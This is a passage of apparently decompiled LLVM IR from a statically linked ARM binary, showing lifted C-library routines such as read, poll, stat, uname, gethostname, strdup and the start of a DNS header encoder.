  %storemerge1 = phi i32 [ %v0_1702c, %dec_label_pc_17020 ], [ %v0_16da4, %dec_label_pc_17010 ], [ %v0_16da4, %dec_label_pc_16ffc ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  %v3_17038 = load i32, i32* %stack_var_0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17040 = load i32, i32* @r7, align 4
  %v2_17040 = inttoptr i32 %v3_17038 to i32*
  store i32 %v0_17040, i32* %v2_17040, align 4
  store i32 %tmp17, i32* @ip, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1704c = load i32, i32* @r7, align 4
  %v2_1704c = add i32 %v1_1704c, 8
  %v3_1704c = inttoptr i32 %v2_1704c to i32*
  store i32 2, i32* %v3_1704c, align 4
  %v0_17050 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_17050, i32* @r5, align 4
  %v0_17054 = load i32, i32* %r2.global-to-local, align 4
  %v2_17054 = mul i32 %v0_17054, 2
  store i32 %v2_17054, i32* %r2.global-to-local, align 4
  %v1_17058 = load i32, i32* @r7, align 4
  %v2_17058 = add i32 %v1_17058, 12
  %v3_17058 = inttoptr i32 %v2_17058 to i32*
  store i32 %v2_17054, i32* %v3_17058, align 4
  %v0_1705c = load i32, i32* @r7, align 4
  %v1_1705c = inttoptr i32 %v0_1705c to i32*
  %v2_1705c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1705c, i32* %v1_1705c, align 4
  %v3_1705c = add i32 %v0_1705c, 4
  %v4_1705c = inttoptr i32 %v3_1705c to i32*
  %v5_1705c = load i32, i32* @sb, align 4
  store i32 %v5_1705c, i32* %v4_1705c, align 4
  %v0_17060 = load i32, i32* @r6, align 4
  %v1_17060 = load i32, i32* @r7, align 4
  %v2_17060 = add i32 %v1_17060, 16
  %v3_17060 = inttoptr i32 %v2_17060 to i32*
  store i32 %v0_17060, i32* %v3_17060, align 4
  %v0_17064 = load i32, i32* %r3.global-to-local, align 4
  %v1_17064 = load i32, i32* @ip, align 4
  %v2_17064 = inttoptr i32 %v1_17064 to i32*
  store i32 %v0_17064, i32* %v2_17064, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1706c:                               ; preds = %dec_label_pc_16f88
  store i32 %tmp17, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_16e14, align 4
  store i32 %v0_16e68, i32* @ip, align 4
  %v3_17080 = load i32, i32* @global_var_2402c.512, align 4
  store i32 %v3_17080, i32* %r3.global-to-local, align 4
  %v0_17084 = load i32, i32* %r2.global-to-local, align 4
  %v3_17084 = add i32 %v3_17080, %v0_16e68
  %v4_17084 = inttoptr i32 %v3_17084 to i32*
  store i32 %v0_17084, i32* %v4_17084, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %bb35, %dec_label_pc_17038, %dec_label_pc_1706c
  %v3_1708c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1708c, i32* @r0, align 4
  %v0_17090 = call i32 @free()
  %v3_17094 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17094, i32* @r0, align 4
  %v0_17098 = call i32 @free()
  store i32 %v0_17098, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_170a4

dec_label_pc_170a0:                               ; preds = %dec_label_pc_16e64, %dec_label_pc_16e98
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_170a4

dec_label_pc_170a4:                               ; preds = %bb, %.thread4, %dec_label_pc_16e48, %dec_label_pc_16e28, %dec_label_pc_1708c, %dec_label_pc_16f74, %dec_label_pc_16efc, %dec_label_pc_170a0
  %v0_170a4 = load i32, i32* @r5, align 4
  store i32 %v0_170a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_170a4

; uselistorder directives
  uselistorder i32 %v2_17054, { 1, 0 }
  uselistorder i32 %v0_17010, { 1, 0 }
  uselistorder i32 %v1_16fec, { 0, 2, 1 }
  uselistorder i32 %v1_16fe8, { 1, 0 }
  uselistorder i32 %v0_16fb8, { 1, 0, 2 }
  uselistorder i32 %v2_16fac, { 1, 0 }
  uselistorder i32 %v1_16eb8, { 2, 1, 0 }
  uselistorder i32 %v1_16eac, { 1, 0 }
  uselistorder i32 %v0_16e84, { 1, 0 }
  uselistorder i32 %v0_16e68, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_16e14, { 1, 0, 2 }
  uselistorder i32 %v0_16dbc, { 1, 0, 2 }
  uselistorder i32 %v0_16da4, { 1, 2, 3, 5, 4, 0, 6, 7 }
  uselistorder i32 %v0_16d9c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32 %tmp17, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 17, 18, 3, 2, 5, 4, 6, 19, 20, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
  uselistorder i32 ()* @free, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0, 22, 30, 29, 28, 15, 14, 13, 12, 4, 11, 27, 26, 25, 24, 23 }
  uselistorder i32* @global_var_2402c.512, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_170a4, { 7, 4, 5, 6, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_170a0, { 1, 0 }
  uselistorder label %dec_label_pc_1708c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17038, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16fe4, { 1, 0 }
  uselistorder label %dec_label_pc_16e64, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_170cc = load i32, i32* @r1, align 4
  %v2_170cc = icmp eq i32 %v0_170cc, 0
  %v3_170d0 = load i32, i32* @r4, align 4
  store i32 %v3_170d0, i32* %stack_var_-8, align 4
  %v0_170d4 = load i32, i32* @r0, align 4
  store i32 %v0_170d4, i32* %r4.global-to-local, align 4
  br i1 %v2_170cc, label %dec_label_pc_170f8, label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %entry
  %v1_170e4 = add i32 %v0_170d4, 260
  %v4_170e8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_170e4)
  %v2_170ec = icmp eq i32 %v4_170e8, 0
  br i1 %v2_170ec, label %dec_label_pc_170fc, label %dec_label_pc_170f8

dec_label_pc_170f8:                               ; preds = %dec_label_pc_170dc, %entry
  br label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170dc, %dec_label_pc_170f8
  %storemerge = phi i32 [ 0, %dec_label_pc_170f8 ], [ 1, %dec_label_pc_170dc ]
  %v1_17100 = load i32, i32* %r4.global-to-local, align 4
  %v2_17100 = add i32 %v1_17100, 256
  %v3_17100 = inttoptr i32 %v2_17100 to i32*
  store i32 %storemerge, i32* %v3_17100, align 4
  %v2_17104 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17104, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 3, 0, 1, 2 }
  uselistorder i32* null, { 6, 2, 0, 3, 4, 5, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_170fc, { 1, 0 }
}

define i32 @function_1710c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1710c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_17110 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17110, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_1710c
  store i32 %arg1, i32* %arg2, align 4
  %v8_17110.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1710c, %bb
  %v8_17110 = phi i32 [ %arg1, %dec_label_pc_1710c ], [ %v8_17110.pre, %bb ]
  ret i32 %v8_17110

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_17124 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_17124, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_17124 = load i32, i32* @r0, align 4
  ret i32 %v2_17124

bb1:                                              ; preds = %entry
  %v0_17128 = call i32 @__syscall_error()
  ret i32 %v0_17128
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17134 = load i32, i32* @global_var_27c38.685, align 4
  %v2_17138 = icmp eq i32 %v3_17134, 0
  br i1 %v2_17138, label %dec_label_pc_17140, label %entry.dec_label_pc_1715c_crit_edge

entry.dec_label_pc_1715c_crit_edge:               ; preds = %entry
  %v3_1715c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1715c

dec_label_pc_17140:                               ; preds = %entry
  %v0_17140 = load i32, i32* @r7, align 4
  store i32 %v0_17140, i32* @ip, align 4
  %v0_17150 = load i32, i32* @r0, align 4
  %v2_17150 = icmp ugt i32 %v0_17150, -4097
  br i1 %v2_17150, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1715c, %dec_label_pc_17140
  %merge = phi i32 [ %v0_17150, %dec_label_pc_17140 ], [ %v0_17180, %dec_label_pc_1715c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_17140
  %v0_17158 = call i32 @__syscall_error()
  br label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %entry.dec_label_pc_1715c_crit_edge, %bb8
  %v3_1715c = phi i32 [ %v3_1715c.pre, %entry.dec_label_pc_1715c_crit_edge ], [ %v0_17158, %bb8 ]
  store i32 %v3_1715c, i32* %stack_var_-24, align 4
  %v6_1715c = load i32, i32* @r1, align 4
  %v15_1715c = load i32, i32* @r7, align 4
  store i32 %v15_1715c, i32* %stack_var_-8, align 4
  %v18_1715c = load i32, i32* @lr, align 4
  %v0_17160 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_17160, i32* @ip, align 4
  %v2_17168 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_1715c, i32* @r1, align 4
  store i32 %v2_17168, i32* @r7, align 4
  %v1_1717c = call i32 @__libc_disable_asynccancel(i32 %v0_17160)
  %v0_17180 = load i32, i32* @r7, align 4
  store i32 %v0_17180, i32* @r0, align 4
  %v2_17184 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17184, i32* @r7, align 4
  store i32 %v18_1715c, i32* @lr, align 4
  %v2_17188 = icmp ugt i32 %v0_17180, -4097
  br i1 %v2_17188, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1715c
  %v0_17190 = call i32 @__syscall_error()
  ret i32 %v0_17190

; uselistorder directives
  uselistorder i32 %v0_17180, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 7, 6, 11, 3, 2, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_1715c, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_171ac = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_171b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_171b8, i32* %r5.global-to-local, align 4
  %v1_171bc = call i32 @uname(i32 %v2_171ac)
  %v7_171c0 = icmp eq i32 %v1_171bc, -1
  br i1 %v7_171c0, label %bb, label %dec_label_pc_171cc

bb:                                               ; preds = %entry
  store i32 %v1_171bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17210

dec_label_pc_171cc:                               ; preds = %entry
  %v2_171cc = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_171d4 = call i32 @strlen(i8* %tmp10)
  %v1_171d8 = add i32 %v3_171d4, 1
  %v1_171dc = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_171d8, %v1_171dc
  br i1 %tmp, label %dec_label_pc_171e4, label %dec_label_pc_17200

dec_label_pc_171e4:                               ; preds = %dec_label_pc_171cc
  %v0_171e8 = call i32 @__aeabi_read_tp()
  %v3_171ec = load i16, i16* @global_var_24070.401, align 2
  %v4_171ec = sext i16 %v3_171ec to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_171f8 = add i32 %v4_171ec, %v0_171e8
  %v4_171f8 = inttoptr i32 %v3_171f8 to i32*
  store i32 22, i32* %v4_171f8, align 4
  %v0_17210.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17210

dec_label_pc_17200:                               ; preds = %dec_label_pc_171cc
  store i32 %v2_171cc, i32* @r1, align 4
  %v0_17204 = load i32, i32* %r6.global-to-local, align 4
  %v2_17208 = inttoptr i32 %v0_17204 to i8*
  %v3_17208 = call i32 @strcpy(i8* %v2_17208, i32 %v2_171cc)
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %bb, %dec_label_pc_171e4, %dec_label_pc_17200
  %v0_17210 = phi i32 [ %v1_171bc, %bb ], [ %v0_17210.pre, %dec_label_pc_171e4 ], [ 0, %dec_label_pc_17200 ]
  ret i32 %v0_17210

; uselistorder directives
  uselistorder i32 %v2_171cc, { 1, 0 }
  uselistorder i32 %v1_171bc, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 22, { 1, 11, 2, 14, 3, 13, 4, 5, 6, 7, 10, 15, 8, 0, 12, 9 }
  uselistorder label %dec_label_pc_17210, { 2, 1, 0 }
}

define i32 @__syscall_poll() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17224 = load i32, i32* @r7, align 4
  store i32 %v3_17224, i32* %stack_var_-8, align 4
  %v0_17230 = load i32, i32* @r0, align 4
  store i32 %v0_17230, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17230, -4095
  br i1 %tmp, label %dec_label_pc_17258, label %dec_label_pc_17240

dec_label_pc_17240:                               ; preds = %entry
  %v0_17244 = call i32 @__aeabi_read_tp()
  %v3_17248 = load i16, i16* @global_var_24070.401, align 2
  %v4_17248 = sext i16 %v3_17248 to i32
  %v0_1724c = load i32, i32* %r2.global-to-local, align 4
  %v1_1724c = sub i32 0, %v0_1724c
  store i32 %v1_1724c, i32* %r2.global-to-local, align 4
  %v3_17250 = add i32 %v4_17248, %v0_17244
  %v4_17250 = inttoptr i32 %v3_17250 to i32*
  store i32 %v1_1724c, i32* %v4_17250, align 4
  %v2_17258.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17258

dec_label_pc_17258:                               ; preds = %entry, %dec_label_pc_17240
  %v1_1725c = phi i32 [ %v0_17230, %entry ], [ -1, %dec_label_pc_17240 ]
  %v2_17258 = phi i32 [ %v3_17224, %entry ], [ %v2_17258.pre, %dec_label_pc_17240 ]
  store i32 %v2_17258, i32* @r7, align 4
  ret i32 %v1_1725c

; uselistorder directives
  uselistorder i32 %v0_17230, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17258, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17268 = load i32, i32* @r4, align 4
  store i32 %v3_17268, i32* %stack_var_-20, align 4
  %v6_17268 = load i32, i32* @r5, align 4
  %v9_17268 = load i32, i32* @r6, align 4
  %v12_17268 = load i32, i32* @r7, align 4
  %v4_17274 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_17278 = icmp eq i32 %v4_17274, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_17278, label %dec_label_pc_17290, label %entry.dec_label_pc_1729c_crit_edge

entry.dec_label_pc_1729c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1729c

dec_label_pc_17290:                               ; preds = %entry
  store i32 %v3_17268, i32* @r4, align 4
  store i32 %v9_17268, i32* @r6, align 4
  store i32 %v12_17268, i32* @r7, align 4
  %v0_17298 = call i32 @__syscall_poll()
  br label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %entry.dec_label_pc_1729c_crit_edge, %dec_label_pc_17290
  %v0_1729c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1729c, i32* @r5, align 4
  %v0_172ac = load i32, i32* @r4, align 4
  store i32 %v0_172ac, i32* @r0, align 4
  %v0_172b0 = call i32 @__syscall_poll()
  store i32 %v0_172b0, i32* @r4, align 4
  %v0_172b8 = load i32, i32* @r5, align 4
  %v1_172bc = call i32 @__libc_disable_asynccancel(i32 %v0_172b8)
  %v0_172c0 = load i32, i32* @r4, align 4
  %v2_172c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_172c8, i32* @r4, align 4
  store i32 %v6_17268, i32* @r5, align 4
  store i32 %v9_17268, i32* @r6, align 4
  store i32 %v12_17268, i32* @r7, align 4
  ret i32 %v0_172c0

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 12, 11, 4, 1, 3, 5, 0, 6, 15, 8, 9, 7, 14, 2, 13, 10 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 12, 11, 4, 1, 3, 5, 0, 6, 15, 8, 9, 7, 14, 2, 13, 10 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_1729c, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 195, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17318, label %dec_label_pc_172fc

dec_label_pc_172fc:                               ; preds = %entry
  %v0_17300 = call i32 @__aeabi_read_tp()
  %v3_17304 = load i16, i16* @global_var_24070.401, align 2
  %v4_17304 = sext i16 %v3_17304 to i32
  %v0_17308 = load i32, i32* %r2.global-to-local, align 4
  %v1_17308 = sub i32 0, %v0_17308
  store i32 %v1_17308, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_17310 = add i32 %v4_17304, %v0_17300
  %v4_17310 = inttoptr i32 %v3_17310 to i32*
  store i32 %v1_17308, i32* %v4_17310, align 4
  br label %dec_label_pc_17328

dec_label_pc_17318:                               ; preds = %entry
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v2_17318 = icmp eq i32 %arg1, 0
  br i1 %v2_17318, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17318
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17318, %bb
  call void @__pseudo_cond_branch(i1 %v2_17318, i32 ptrtoint (i32* @global_var_150f8.862 to i32))
  br label %dec_label_pc_17328

dec_label_pc_17328:                               ; preds = %dec_label_pc_172fc, %.thread
  %v0_17328 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17328

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_17328, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1733c = load i32, i32* @r7, align 4
  store i32 %v3_1733c, i32* %stack_var_-8, align 4
  %v0_17348 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17348, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17348, -4095
  br i1 %tmp, label %dec_label_pc_17370, label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %entry
  %v0_1735c = call i32 @__aeabi_read_tp()
  %v3_17360 = load i16, i16* @global_var_24070.401, align 2
  %v4_17360 = sext i16 %v3_17360 to i32
  %v0_17364 = load i32, i32* %r2.global-to-local, align 4
  %v1_17364 = sub i32 0, %v0_17364
  store i32 %v1_17364, i32* %r2.global-to-local, align 4
  %v3_17368 = add i32 %v4_17360, %v0_1735c
  %v4_17368 = inttoptr i32 %v3_17368 to i32*
  store i32 %v1_17364, i32* %v4_17368, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17370.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17370

dec_label_pc_17370:                               ; preds = %entry, %dec_label_pc_17358
  %v1_17374 = phi i32 [ %v0_17348, %entry ], [ -1, %dec_label_pc_17358 ]
  %v2_17370 = phi i32 [ %v3_1733c, %entry ], [ %v2_17370.pre, %dec_label_pc_17358 ]
  store i32 %v2_17370, i32* @r7, align 4
  ret i32 %v1_17374

; uselistorder directives
  uselistorder i32 %v0_17348, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17370, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_173c4, label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %entry
  %v0_173ac = call i32 @__aeabi_read_tp()
  %v3_173b0 = load i16, i16* @global_var_24070.401, align 2
  %v4_173b0 = sext i16 %v3_173b0 to i32
  %v0_173b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_173b4 = sub i32 0, %v0_173b4
  store i32 %v1_173b4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_173bc = add i32 %v4_173b0, %v0_173ac
  %v4_173bc = inttoptr i32 %v3_173bc to i32*
  store i32 %v1_173b4, i32* %v4_173bc, align 4
  %v0_173cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_173cc

dec_label_pc_173c4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_173c4 = icmp eq i32 %arg1, 0
  br i1 %v2_173c4, label %dec_label_pc_173d8, label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %dec_label_pc_173c4, %dec_label_pc_173a8
  %v0_173cc = phi i32 [ %arg1, %dec_label_pc_173c4 ], [ %v0_173cc.pre, %dec_label_pc_173a8 ]
  %v3_173d0 = ashr i32 %v0_173cc, 31
  br label %dec_label_pc_173dc

dec_label_pc_173d8:                               ; preds = %dec_label_pc_173c4
  br label %dec_label_pc_173dc

dec_label_pc_173dc:                               ; preds = %dec_label_pc_173cc, %dec_label_pc_173d8
  %v1_173e4 = phi i32 [ %v0_173cc, %dec_label_pc_173cc ], [ %tmp8, %dec_label_pc_173d8 ]
  %storemerge = phi i32 [ %v3_173d0, %dec_label_pc_173cc ], [ %tmp, %dec_label_pc_173d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_173e4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_173dc, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_173f0 = load i32, i32* @r0, align 4
  %v1_173f0 = load i32, i32* @r1, align 4
  %v2_173f0 = inttoptr i32 %v0_173f0 to i8*
  %v3_173f0 = call i32 @_memcpy(i8* %v2_173f0, i32 %v1_173f0)
  ret i32 %v3_173f0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17400 = load i32, i32* @r4, align 4
  store i32 %v3_17400, i32* %stack_var_-16, align 4
  %v9_17400 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_17408 = call i32 @strlen(i8* %arg1)
  %v1_1740c = add i32 %v3_17408, 1
  store i32 %v1_1740c, i32* @r4, align 4
  %v1_17414 = call i32 @malloc(i32 %v1_1740c)
  store i32 %v1_17414, i32* %r5.global-to-local, align 4
  %v2_17418 = icmp eq i32 %v1_17414, 0
  br i1 %v2_17418, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_17424 = xor i1 %v2_17418, true
  call void @__pseudo_cond_branch(i1 %v1_17424, i32 ptrtoint (i32* @global_var_d5a0.705 to i32))
  %v0_17428 = load i32, i32* %r5.global-to-local, align 4
  %v2_1742c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1742c, i32* @r4, align 4
  store i32 %v9_17400, i32* @r6, align 4
  ret i32 %v0_17428

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 11, 10, 9, 3, 1, 12, 13, 19, 8, 7, 6, 2, 5, 4, 18, 17, 16, 15, 0, 14 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_17438 = load i32, i32* @lr, align 4
  store i32 %v0_17438, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_17444 = icmp sgt i32 %arg3, 11
  br i1 %v7_17444, label %dec_label_pc_1744c, label %dec_label_pc_17518

dec_label_pc_1744c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1744c = add i32 %tmp, 1
  %v2_1744c = inttoptr i32 %v1_1744c to i8*
  %v3_1744c = load i8, i8* %v2_1744c, align 1
  store i8 %v3_1744c, i8* %tmp16, align 1
  %v0_17454 = load i32, i32* @ip, align 4
  %v1_17454 = inttoptr i32 %v0_17454 to i32*
  %v2_17454 = load i32, i32* %v1_17454, align 4
  %v1_17458 = trunc i32 %v2_17454 to i8
  %v4_17458 = add i32 %arg2, 1
  %v5_17458 = inttoptr i32 %v4_17458 to i8*
  store i8 %v1_17458, i8* %v5_17458, align 1
  %v0_1745c = load i32, i32* @ip, align 4
  %v1_1745c = add i32 %v0_1745c, 8
  %v2_1745c = inttoptr i32 %v1_1745c to i32*
  %v3_1745c = load i32, i32* %v2_1745c, align 4
  %v1_17460 = add i32 %v0_1745c, 20
  %v2_17460 = inttoptr i32 %v1_17460 to i32*
  %v3_17460 = load i32, i32* %v2_17460, align 4
  %v1_17464 = add i32 %v0_1745c, 4
  %v2_17464 = inttoptr i32 %v1_17464 to i32*
  %v3_17464 = load i32, i32* %v2_17464, align 4
  %v1_17468 = add i32 %v0_1745c, 12
  %v2_17468 = inttoptr i32 %v1_17468 to i32*
  %v3_17468 = load i32, i32* %v2_17468, align 4
  %v2_1746c = icmp eq i32 %v3_17460, 0
  br i1 %v2_1746c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1744c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1744c, %bb
  %v0_1747c = phi i32 [ 0, %dec_label_pc_1744c ], [ 1, %bb ]
  %v1_17474 = urem i32 %v3_1745c, 16
  %v2_17478 = icmp eq i32 %v3_17464, 0
  %v4_1747c = mul nuw nsw i32 %v1_17474, 8
  %v5_1747c = or i32 %v0_1747c, %v4_1747c
  %v1_17480 = add i32 %v0_1745c, 16
  %v2_17480 = inttoptr i32 %v1_17480 to i32*
